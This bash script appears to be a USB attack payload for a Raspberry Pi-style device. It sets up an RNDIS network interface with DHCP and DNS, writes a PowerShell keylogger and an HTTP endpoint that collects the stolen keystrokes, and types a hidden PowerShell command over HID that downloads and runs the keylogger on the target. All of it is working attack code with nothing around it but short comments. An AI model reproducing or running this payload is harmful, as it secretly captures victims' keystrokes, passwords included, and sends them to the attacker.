#!/bin/bash

# Bring up RNDIS interface with static IP and DHCP/DNS
sudo ifconfig usb0 172.16.42.1 netmask 255.255.255.0 up
sudo systemctl stop dnsmasq || true
cat <<EOF | sudo tee /etc/dnsmasq.d/usb0.conf
interface=usb0
dhcp-range=172.16.42.10,172.16.42.50,255.255.255.0,12h
dhcp-option=3,172.16.42.1
dhcp-option=6,172.16.42.1
listen-address=172.16.42.1
EOF
sudo systemctl restart dnsmasq

# Create a simple PowerShell keylogger script and serve it
sudo mkdir -p /srv/http

cat <<'EOF' | sudo tee /srv/http/keylogger.ps1
# Basic PowerShell Keylogger
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;
public class KeyboardListener {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
}
"@
$log = ""
while ($true) {
    Start-Sleep -Milliseconds 50
    foreach ($char in 8..222) {
        if ([KeyboardListener]::GetAsyncKeyState($char) -eq -32767) {
            $key = [char]$char
            $log += $key
            if ($log.Length -ge 20) {
                try {
                    Invoke-WebRequest -Uri "http://172.16.42.1:8080/exfil" -Method POST -Body $log
                } catch {}
                $log = ""
            }
        }
    }
}
EOF

# Minimal exfil endpoint
cat <<EOF | sudo tee /srv/http/exfil.py
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
class Exfil(BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers['Content-Length'])
        data = self.rfile.read(length)
        with open('/home/pi/exfil/keylog.txt','ab') as f:
            f.write(data+b'\n')
        self.send_response(200)
        self.end_headers()
server = HTTPServer(('0.0.0.0', 8080), Exfil)
server.serve_forever()
EOF
chmod +x /srv/http/exfil.py

# Start HTTP server for payload and exfil
cd /srv/http
sudo python3 -m http.server 80 &
sudo ./exfil.py &
sleep 2

# Trigger download and execution via HID
python3 /home/pi/payloads/rndis_keylogger/send_keys.py 'powershell -w hidden -c "iwr http://172.16.42.1/keylogger.ps1 -OutFile $env:TEMP\\keylogger.ps1; start powershell -w hidden -c $env:TEMP\\keylogger.ps1"'$'\n'

# Let it run for a while to collect data
sleep 60

# Cleanup servers
sudo pkill -f "http.server"
sudo pkill -f "/srv/http/exfil.py"